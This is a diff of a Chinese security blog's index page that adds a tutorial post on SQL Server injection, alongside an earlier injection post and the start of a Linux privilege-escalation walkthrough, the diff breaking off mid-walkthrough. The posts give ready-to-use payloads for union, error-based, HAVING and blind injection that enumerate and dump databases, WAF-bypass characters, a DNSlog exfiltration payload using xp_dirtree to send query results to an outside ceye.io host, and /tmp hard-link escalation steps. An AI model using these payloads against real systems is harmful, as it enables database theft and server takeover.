@@ -43,14 +43,15 @@
 
   
     
- 	  <script src="/lib/clickLove.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+ 	  <script src="/lib/clickLove.js"></script>
   
   
 
 
   
 
-</head>
+<link rel="stylesheet" href="/css/prism-hopscotch.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
 
 <body>
   <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="container" q-class="show:isCtnShow">
@@ -192,6 +193,189 @@
             
 
   
+    <article id="post-7" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/2019/10/11/7/" target="_blank">SQL SERVER 注入（二）</a>
+  
+    </h1>
+  
+
+
+  
+  
+<a href="/2019/10/11/7/" class="archive-article-date">
+        <time datetime="2019-10-11T13:09:17.971Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-11</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h1 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h1><p>SQL server 中的联合查询注入和 MySQL 中的联合查询注入非常相似，但是也有不同的地方。相同点是都必须要有回显位，并且要与列数相同。不同的是MySQL占位符一般用1，2，3，4数字，而 SQL server 中要用到 null 作为占位符。因为如果用数字的话会牵扯到隐式转化的问题而导致无法有正常的回显。</p>
+<p>首先利用 order by 语句查询出有几列<br><img src="/images/7/0.png" alt><br><img src="/images/7/1.png" alt></p>
+<p>查询出有 4列后进行联合查询注入 ，首先查出所有数据库名。</p>
+<p><img src="/images/7/2.png" alt></p>
+<p>之后爆出 test 库下的所有表</p>
+<p><img src="/images/7/3.png" alt></p>
+<p>爆出 message 表下的所有字段</p>
+<p><img src="/images/7/4.png" alt></p>
+<p>之后可以任意的查询字段值了</p>
+<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p>报错注入相对简单很多，但前提是网站管理员打开了报错界面的详细信息，而对于粗心的管<br>理员的话就非常有可能忘记关闭了。在报错注入中我们最重要的是收集一些bypass，如果<br>碰到 WAF也可以尝试绕过，下面是我收集的一些</p>
+<p><strong>判断数据库类型</strong></p>
+<pre class="line-numbers language-java"><code class="language-java">and <span class="token function">exists</span> <span class="token punctuation">(</span>select <span class="token operator">*</span> from sysobjects<span class="token punctuation">)</span><span class="token operator">--</span>返回正常为mssql
+and <span class="token function">exists</span> <span class="token punctuation">(</span>select <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> from sysobjects<span class="token punctuation">)</span><span class="token operator">--</span>有时上面那个语句不行就用这个
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><img src="/images/7/5.png" alt></p>
+<p><strong>判断数据库版本</strong></p>
+<pre class="line-numbers language-java"><code class="language-java">and <span class="token number">1</span><span class="token operator">=</span>@<span class="token annotation punctuation">@version</span><span class="token operator">--</span>这个语句要在有回显的模式下才可以哦
+and <span class="token function">substring</span><span class="token punctuation">(</span><span class="token punctuation">(</span>select @<span class="token annotation punctuation">@version</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'2008'</span><span class="token operator">--</span>适用于无回显模式
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><img src="/images/7/6.png" alt></p>
+<p><strong>获取所有数据库的个数</strong></p>
+<pre class="line-numbers language-java"><code class="language-java">and <span class="token number">1</span><span class="token operator">=</span><span class="token punctuation">(</span>select <span class="token function">quotename</span><span class="token punctuation">(</span><span class="token function">count</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span> from master<span class="token punctuation">.</span><span class="token punctuation">.</span>sysdatabases<span class="token punctuation">)</span><span class="token operator">--</span>
+and <span class="token number">1</span><span class="token operator">=</span><span class="token punctuation">(</span>select <span class="token function">cast</span><span class="token punctuation">(</span><span class="token function">count</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> as varchar<span class="token punctuation">)</span><span class="token operator">%</span><span class="token function">2bchar</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> from master<span class="token punctuation">.</span><span class="token punctuation">.</span>sysdatabases<span class="token punctuation">)</span> <span class="token operator">--</span>
+and <span class="token number">1</span><span class="token operator">=</span><span class="token punctuation">(</span>select <span class="token function">str</span><span class="token punctuation">(</span><span class="token function">count</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span>2b<span class="token string">'|'</span> from master<span class="token punctuation">.</span><span class="token punctuation">.</span>sysdatabases where dbid<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">--</span>
+and <span class="token number">1</span><span class="token operator">=</span><span class="token punctuation">(</span>select <span class="token function">cast</span><span class="token punctuation">(</span><span class="token function">count</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> as varchar<span class="token punctuation">)</span><span class="token operator">%</span><span class="token function">2bchar</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> from master<span class="token punctuation">.</span><span class="token punctuation">.</span>sysdatabases where dbid<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">-</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/images/7/7.png" alt></p>
+<p><strong>获取数据库名称</strong></p>
+<pre class="line-numbers language-java"><code class="language-java">（该语句是一次性获取全部数据库的，且语句只适合<span class="token operator">>=</span><span class="token number">2005</span>，两条语句可供选择使用）
+and <span class="token number">1</span><span class="token operator">=</span><span class="token punctuation">(</span>select <span class="token function">quotename</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> from master<span class="token punctuation">.</span><span class="token punctuation">.</span>sysdatabases FOR XML <span class="token function">PATH</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span>
+and <span class="token number">1</span><span class="token operator">=</span><span class="token punctuation">(</span>select <span class="token string">'|'</span><span class="token operator">%</span>2bname<span class="token operator">%</span>2b<span class="token string">'|'</span> from master<span class="token punctuation">.</span><span class="token punctuation">.</span>sysdatabases FOR XML <span class="token function">PATH</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p><img src="/images/7/8.png" alt></p>
+<p><strong>获取当前数据库</strong></p>
+<pre class="line-numbers language-java"><code class="language-java">and <span class="token function">db_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span>
+and <span class="token number">1</span><span class="token operator">=</span><span class="token punctuation">(</span>select <span class="token function">db_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><img src="/images/7/9.png" alt></p>
+<p><strong>获取当前数据库中的表名</strong></p>
+<pre class="line-numbers language-java"><code class="language-java"><span class="token punctuation">(</span>有<span class="token number">2</span> 个语句可供选择使用<span class="token punctuation">)</span>下列语句可一次爆数据库所有表（只限于mssql2005 及以上版本）
+and <span class="token number">1</span><span class="token operator">=</span><span class="token punctuation">(</span>select <span class="token function">quotename</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> from 数据库名<span class="token punctuation">.</span><span class="token punctuation">.</span>sysobjects where xtype<span class="token operator">=</span><span class="token string">'U'</span> FOR XML <span class="token function">PATH</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span>
+and <span class="token number">1</span><span class="token operator">=</span><span class="token punctuation">(</span>select <span class="token string">'|'</span><span class="token operator">%</span>2bname<span class="token operator">%</span>2b<span class="token string">'|'</span> from 数据库名<span class="token punctuation">.</span><span class="token punctuation">.</span>sysobjects where xtype<span class="token operator">=</span><span class="token string">'U'</span> FOR XML <span class="token function">PATH</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p><img src="/images/7/10.png" alt></p>
+<p><strong>获得表里的列</strong></p>
+<pre class="line-numbers language-java"><code class="language-java">一次爆指定表的所有列（只限于 mssql2005 及以上版本）：
+and <span class="token number">1</span><span class="token operator">=</span><span class="token punctuation">(</span>select <span class="token function">quotename</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> from 数据库名<span class="token punctuation">.</span><span class="token punctuation">.</span>syscolumns where id <span class="token operator">=</span><span class="token punctuation">(</span>select id from 数据库名<span class="token punctuation">.</span><span class="token punctuation">.</span>sysobjects where name<span class="token operator">=</span><span class="token string">'指定表名'</span><span class="token punctuation">)</span> FOR XML <span class="token function">PATH</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span>
+and <span class="token number">1</span><span class="token operator">=</span><span class="token punctuation">(</span>select <span class="token string">'|'</span><span class="token operator">%</span>2bname<span class="token operator">%</span>2b<span class="token string">'|'</span> from 数据库名<span class="token punctuation">.</span><span class="token punctuation">.</span>syscolumns where id <span class="token operator">=</span><span class="token punctuation">(</span>select id from 数据库名<span class="token punctuation">.</span><span class="token punctuation">.</span>sysobjects where name<span class="token operator">=</span><span class="token string">'指定表名'</span><span class="token punctuation">)</span> FOR XML <span class="token function">PATH</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p><img src="/images/7/11.png" alt></p>
+<p><strong>获取指定数据库中的表的所有值</strong></p>
+<pre class="line-numbers language-java"><code class="language-java">逐条爆指定表的所有字段的数据（只限于 mssql2005 及以上版本）：
+and <span class="token number">1</span><span class="token operator">=</span><span class="token punctuation">(</span>select top <span class="token number">1</span> <span class="token operator">*</span> from 指定数据库<span class="token punctuation">.</span><span class="token punctuation">.</span>指定表名 where 排除条件 FOR XML <span class="token function">PATH</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">--</span>
+一次性爆 N条所有字段的数据（只限于 mssql2005 及以上版本）：
+and <span class="token number">1</span><span class="token operator">=</span><span class="token punctuation">(</span>select top N <span class="token operator">*</span> from 指定数据库<span class="token punctuation">.</span><span class="token punctuation">.</span>指定表名 FOR XML <span class="token function">PATH</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">--</span>复制代码
+and <span class="token number">1</span><span class="token operator">=</span><span class="token punctuation">(</span>select top <span class="token number">1</span> <span class="token operator">*</span> from 指定数据库<span class="token punctuation">.</span><span class="token punctuation">.</span>指定表名 FOR XML <span class="token function">PATH</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/images/7/12.png" alt></p>
+<h2 id="having语法注入"><a href="#having语法注入" class="headerlink" title="having语法注入"></a>having语法注入</h2><p>如果页面开启了报错页面的详细信息，我们也可以用having 语法直接爆出列名，利用手法是在每一次爆出列名后再加上爆出的列名一直进行。<br><img src="/images/7/13.png" alt></p>
+<p>爆出列名 id,我们利用 group by构造出如下语句爆出下一个列名<br><img src="/images/7/14.png" alt></p>
+<p>之后依次爆出所有的列名之后页面就会返回正常页面<br><img src="/images/7/15.png" alt></p>
+<h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><p>大多数的站很少会开启报错页面，盲注是比较常见的类型。基本的盲注分为布尔型盲注 和时间盲注，但这两种注入都非常浪费时间，解决盲注时间问题的方法无非是写脚本或者利 用 DNSlog，而 DNSlog 注入的方式会大大减少注入的时间，所以也是首选的方法。在 sqlserver 中布尔盲注也没有太多的手法，依然是分割字符串并用 ascii 函数和二分法进行比较依次得 出整个字符串。而用到的语句也是在 0x00 中写到的最基本的三个视图的基本利用。 </p>
+<h2 id="普通盲注"><a href="#普通盲注" class="headerlink" title="普通盲注"></a>普通盲注</h2><p>Payload：</p>
+<pre class="line-numbers language-java"><code class="language-java">and <span class="token function">ascii</span><span class="token punctuation">(</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token punctuation">(</span>select top <span class="token number">1</span> name from master<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>sysdatabases<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">109</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>其中的 select top 1 name from master.dbo.sysdatabases 就是我们要查询的内容并且<br>进行分割，方法很直白.</p>
+<h2 id="DNSlog注入"><a href="#DNSlog注入" class="headerlink" title="DNSlog注入"></a>DNSlog注入</h2><p>DNSlog注入的基本原理是将查询出来的字符进行拼接之后进行访问 xxxxx.ceye.io 及其子域名，产生出 DNSlog日志，通过查看日志我们就可以看到我们所查询出来的内容。而在这时，我们学习的单行查询就很重要了，因为在拼接URL 的时候，只能拼接一个单词作为子域名进行访问，如果是多个的话就不会产生DNS 日志。这里有一个知道创宇的 DNS 平台：<a href="http://ceye.io" target="_blank" rel="noopener">http://ceye.io</a></p>
+<p><code>SQL server 的DNSlog注入语句:</code></p>
+<pre class="line-numbers language-java"><code class="language-java"><span class="token punctuation">;</span>declare <span class="token annotation punctuation">@a</span> <span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span>set <span class="token annotation punctuation">@a</span><span class="token operator">=</span><span class="token string">'\\'</span><span class="token operator">%</span><span class="token function">2b</span><span class="token punctuation">(</span>select top <span class="token number">1</span> name from master<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>sysdata
+bases<span class="token punctuation">)</span><span class="token operator">%</span>2b<span class="token string">'.*****.ceye.io\abc'</span><span class="token punctuation">;</span>exec master<span class="token punctuation">.</span><span class="token punctuation">.</span>xp_dirtree <span class="token annotation punctuation">@a</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>实际操作：</p>
+<p><img src="/images/7/16.png" alt></p>
+<p>查出第一个数据库的库名为 master<br><img src="/images/7/17.png" alt></p>
+<p>然后我们利用 sysdatabases 的dbid字段查询处 dbid=5时的用户创建的数据库为test</p>
+<pre class="line-numbers language-java"><code class="language-java">http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">10.19</span><span class="token operator">/</span><span class="token keyword">char</span><span class="token punctuation">.</span>asp<span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">27</span><span class="token punctuation">;</span>declare<span class="token operator">%</span><span class="token number">20</span><span class="token annotation punctuation">@a</span><span class="token operator">%</span><span class="token function">20char</span><span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span>set<span class="token operator">%</span><span class="token number">20</span><span class="token annotation punctuation">@a</span><span class="token operator">=</span><span class="token operator">%</span><span class="token number">27</span>\\<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token function">2b</span><span class="token punctuation">(</span>select<span class="token operator">%</span>20name<span class="token operator">%</span>20from<span class="token operator">%</span>20master<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>sysdatabases<span class="token operator">%</span>20where<span class="token operator">%</span>20dbid<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token operator">%</span>2b<span class="token operator">%</span><span class="token number">27</span><span class="token punctuation">.</span>py88oq<span class="token punctuation">.</span>ceye<span class="token punctuation">.</span>io\abc<span class="token operator">%</span><span class="token number">27</span><span class="token punctuation">;</span>exec<span class="token operator">%</span>20master<span class="token punctuation">.</span><span class="token punctuation">.</span>xp_dirtree<span class="token operator">%</span><span class="token number">20</span><span class="token annotation punctuation">@a</span><span class="token punctuation">;</span><span class="token operator">-</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/7/18.png" alt></p>
+<p>DNSlog注入还可以对 MySQL,oracle 数据库还有一些 CMS 都有利用，非常强大。具体的<br>注入细节问题访问：<br><a href="https://www.jianshu.com/p/ba52cf6e47db" target="_blank" rel="noopener">https://www.jianshu.com/p/ba52cf6e47db</a></p>
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">注入</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Web安全</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">sql server</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+    
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/Web安全//" class="article-tag-list-link color1">Web安全</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2019/10/11/7/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-6" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -261,13 +445,15 @@
 <p><img src="/images/6/5.png" alt></p>
 <p>Tip:在对 sysobjects 和 syscolumns 使用的时候我们需要增加一个 xtype 作为限制条件，<br>而在两个视图当中也都有着不同的含义。具体参照：</p>
 <p><a href="https://www.cnblogs.com/zhaomengmeng/p/4933828.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhaomengmeng/p/4933828.html</a></p>
-<h2 id="注释符以及各种信息探测"><a href="#注释符以及各种信息探测" class="headerlink" title="注释符以及各种信息探测"></a>注释符以及各种信息探测</h2><h3 id="注释风格"><a href="#注释风格" class="headerlink" title="注释风格"></a>注释风格</h3><pre><code>/*
--- 常用
-;%00
-</code></pre><h3 id="空白格字符（多用来绕过-WAF）"><a href="#空白格字符（多用来绕过-WAF）" class="headerlink" title="空白格字符（多用来绕过 WAF）"></a>空白格字符（多用来绕过 WAF）</h3><pre><code>01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,1415,16,17,18,19,1A,1B,1
-C,1D,1E,1F,20
-/**/
-</code></pre><h3 id="常用运算符号"><a href="#常用运算符号" class="headerlink" title="常用运算符号"></a>常用运算符号</h3><table>
+<h2 id="注释符以及各种信息探测"><a href="#注释符以及各种信息探测" class="headerlink" title="注释符以及各种信息探测"></a>注释符以及各种信息探测</h2><h3 id="注释风格"><a href="#注释风格" class="headerlink" title="注释风格"></a>注释风格</h3><pre class="line-numbers language-java"><code class="language-java"><span class="token operator">/</span><span class="token operator">*</span>
+<span class="token operator">--</span> 常用
+<span class="token punctuation">;</span><span class="token operator">%</span><span class="token number">00</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<h3 id="空白格字符（多用来绕过-WAF）"><a href="#空白格字符（多用来绕过-WAF）" class="headerlink" title="空白格字符（多用来绕过 WAF）"></a>空白格字符（多用来绕过 WAF）</h3><pre class="line-numbers language-java"><code class="language-java"><span class="token number">01</span><span class="token punctuation">,</span><span class="token number">02</span><span class="token punctuation">,</span><span class="token number">03</span><span class="token punctuation">,</span><span class="token number">04</span><span class="token punctuation">,</span><span class="token number">05</span><span class="token punctuation">,</span><span class="token number">06</span><span class="token punctuation">,</span><span class="token number">07</span><span class="token punctuation">,</span><span class="token number">08</span><span class="token punctuation">,</span><span class="token number">09</span><span class="token punctuation">,</span>0A<span class="token punctuation">,</span>0B<span class="token punctuation">,</span>0C<span class="token punctuation">,</span><span class="token number">0D</span><span class="token punctuation">,</span>0E<span class="token punctuation">,</span><span class="token number">0F</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">1415</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span>1A<span class="token punctuation">,</span>1B<span class="token punctuation">,</span><span class="token number">1</span>
+C<span class="token punctuation">,</span><span class="token number">1D</span><span class="token punctuation">,</span>1E<span class="token punctuation">,</span><span class="token number">1F</span><span class="token punctuation">,</span><span class="token number">20</span>
+<span class="token comment" spellcheck="true">/**/</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<h3 id="常用运算符号"><a href="#常用运算符号" class="headerlink" title="常用运算符号"></a>常用运算符号</h3><table>
 <thead>
 <tr>
 <th align="center">+</th>
@@ -299,39 +485,41 @@ C,1D,1E,1F,20
 <td align="left">位异或运算，从两个表达式中取对应的位。如果输入表达式中两个位只有一个的值为 1 时，结果中的位就被设置为 1；只有当两个位的值都为 0 或 1 时，结果中的位才被设置为 0</td>
 </tr>
 </tbody></table>
-<h3 id="基础信息探测"><a href="#基础信息探测" class="headerlink" title="基础信息探测"></a>基础信息探测</h3><pre><code>@@VERSION,@@SERVERNAME,@@SERVICENAME; 
---Microsoft SQL Server 2008 (RTM) - 10.0.1600.22 (X64) 
---WIN-2008
---MSSQLSERVER
+<h3 id="基础信息探测"><a href="#基础信息探测" class="headerlink" title="基础信息探测"></a>基础信息探测</h3><pre class="line-numbers language-java"><code class="language-java">@<span class="token annotation punctuation">@VERSION</span><span class="token punctuation">,</span>@<span class="token annotation punctuation">@SERVERNAME</span><span class="token punctuation">,</span>@<span class="token annotation punctuation">@SERVICENAME</span><span class="token punctuation">;</span> 
+<span class="token operator">--</span>Microsoft SQL Server <span class="token function">2008</span> <span class="token punctuation">(</span>RTM<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">10.0</span><span class="token punctuation">.</span><span class="token number">1600</span><span class="token punctuation">.</span><span class="token function">22</span> <span class="token punctuation">(</span>X64<span class="token punctuation">)</span> 
+<span class="token operator">--</span>WIN<span class="token operator">-</span><span class="token number">2008</span>
+<span class="token operator">--</span>MSSQLSERVER
 
-USER,CURRENT_USER,SESSION_USER,SYSTEM_USER; 
---dbo
---dbo
---dbo
---sa
+USER<span class="token punctuation">,</span>CURRENT_USER<span class="token punctuation">,</span>SESSION_USER<span class="token punctuation">,</span>SYSTEM_USER<span class="token punctuation">;</span> 
+<span class="token operator">--</span>dbo
+<span class="token operator">--</span>dbo
+<span class="token operator">--</span>dbo
+<span class="token operator">--</span>sa
 
-USER_NAME(),HOST_NAME(),HOST_ID(),SUSER_NAME(); 
---dbo
---wyb
---46530
---sa
+<span class="token function">USER_NAME</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">HOST_NAME</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">HOST_ID</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">SUSER_NAME</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+<span class="token operator">--</span>dbo
+<span class="token operator">--</span>wyb
+<span class="token operator">--</span><span class="token number">46530</span>
+<span class="token operator">--</span>sa
 
-USER_ID(),USER_SID(); 
---1
---&lt;01&gt;
-ORIGINAL_LOGIN(); 
---sa
-</code></pre><h2 id="利用-top-进行限制查询"><a href="#利用-top-进行限制查询" class="headerlink" title="利用 top 进行限制查询"></a>利用 top 进行限制查询</h2><p>在 mysql 注入中我们会遇到一行不能够显示多列的情况，解决的方法是利用 limit m,n 进行<br>控制，将数据逐行输出。而在 SQL server 中也有这样的情况（尤其是利用 DNSlog 注入时），<br>我们就可以用如下两种方法做到与 limit m,n 同样的效果</p>
+<span class="token function">USER_ID</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">USER_SID</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+<span class="token operator">--</span><span class="token number">1</span>
+<span class="token operator">--</span><span class="token operator">&lt;</span><span class="token number">01</span><span class="token operator">></span>
+<span class="token function">ORIGINAL_LOGIN</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+<span class="token operator">--</span>sa
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="利用-top-进行限制查询"><a href="#利用-top-进行限制查询" class="headerlink" title="利用 top 进行限制查询"></a>利用 top 进行限制查询</h2><p>在 mysql 注入中我们会遇到一行不能够显示多列的情况，解决的方法是利用 limit m,n 进行<br>控制，将数据逐行输出。而在 SQL server 中也有这样的情况（尤其是利用 DNSlog 注入时），<br>我们就可以用如下两种方法做到与 limit m,n 同样的效果</p>
 <p>(1)在查询数据库名称时利用 dbid 进行限制查询</p>
 <p>由于 dbid 是系统数据库所特有的，所有可以依次从 1 到 n 注出所有的数据库名</p>
 <p><img src="/images/6/6.png" alt></p>
 <p>(2)在查询表和字段时利用 top 语法进行查询</p>
 <p>在 sysobjects 和 syscolumns 视图当拥有大量的数据，如果依据 id 值进行限制会非常的繁<br>琐，浪费时间。所以可以用到如下 sql 查询语法：</p>
 <p>取第 m 条到第 n 条记录</p>
-<pre><code>select top (n-m+1) id from tablename
-where id not in (
-    select top m-1 id from tablename
-)</code></pre><p>具体利用：</p>
+<pre class="line-numbers language-java"><code class="language-java">select <span class="token function">top</span> <span class="token punctuation">(</span>n<span class="token operator">-</span>m<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> id from tablename
+where id not <span class="token function">in</span> <span class="token punctuation">(</span>
+    select top m<span class="token operator">-</span><span class="token number">1</span> id from tablename
+<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>具体利用：</p>
 <p><img src="/images/6/7.png" alt></p>
 <p>这样我们在 DNSlog 注入时才能拼接完整的 payload。要学习新的sql注入，就要从基本的sql语句开始。</p>
 
@@ -441,39 +629,50 @@ where id not in (
     <h2 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权"></a>Linux提权</h2><p>上一次提权提到了内核漏洞本地提权，SUID提权，但是在面对复杂的服务器环境时需要了解更多的提权方法。上次在ny护网的时候搞到了一台Linux服务器的低权限oracle账号，然后尝试提权成功，所以有了这篇文章。</p>
 <h2 id="低内核版本提权"><a href="#低内核版本提权" class="headerlink" title="低内核版本提权"></a>低内核版本提权</h2><p>发行版本是rhel5.5内核版本是比较低的 2.6.18，但是脏牛漏洞是对内核版本大于2.6.22可以利用，所以我们可以利用tmp目录权限、suid 权限和C语言使普通帐号提权为ROOT权限。<br><code>tmp目录具有777权限</code></p>
 <p>1.进入tmp目录并创建目录exploit</p>
-<pre><code>cd /tmp
+<pre class="line-numbers language-java"><code class="language-java">cd <span class="token operator">/</span>tmp
 mkdir exploit
-</code></pre><p>2.查看ping命令所具有的权限</p>
-<pre><code>ll /bin/ping
-</code></pre><p>3.创建target文件硬链接</p>
-<pre><code>ln /bin/ping /tmp/exploit/target
-</code></pre><p>4.查看target文件权限</p>
-<pre><code>ll /tmp/exploit/target
-</code></pre><p>5.把target文件加载到内存中</p>
-<pre><code>exec 3&lt; /tmp/exploit/target
-</code></pre><p>6.查看target在内存的状态</p>
-<pre><code>ll /proc/$$/fd/3
-</code></pre><p>7.删除target文件</p>
-<pre><code>rm -rf /tmp/exploit/
-</code></pre><p>8.再次查看target在内存的状态</p>
-<pre><code>ll /proc/$$/fd/3
-</code></pre><p>9.创建一个c语言代码</p>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>2.查看ping命令所具有的权限</p>
+<pre class="line-numbers language-java"><code class="language-java">ll <span class="token operator">/</span>bin<span class="token operator">/</span>ping
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>3.创建target文件硬链接</p>
